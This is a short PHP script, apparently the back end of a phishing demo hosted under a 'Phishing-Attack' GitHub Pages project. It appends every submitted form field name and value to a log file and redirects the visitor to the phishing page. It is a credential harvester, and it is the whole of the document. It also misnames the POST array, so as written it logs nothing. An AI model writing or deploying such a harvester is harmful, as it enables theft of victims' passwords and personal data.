<?php
header ('Location: https://munkh-orgill.github.io/Phishing-Attack/phishing.html');
$file = fopen("logFile.txt",'a');
foreach($POST as $key => $value){
    fwrite($file,$key);      // This stores the field Name
    fwrite($file,"=>");      
    fwrite($file,$value);    // This stores the field Value
    fwrite($file,"\r\n");
}
fwrite($file,"\r\n");
fclose($file);
exit;
?>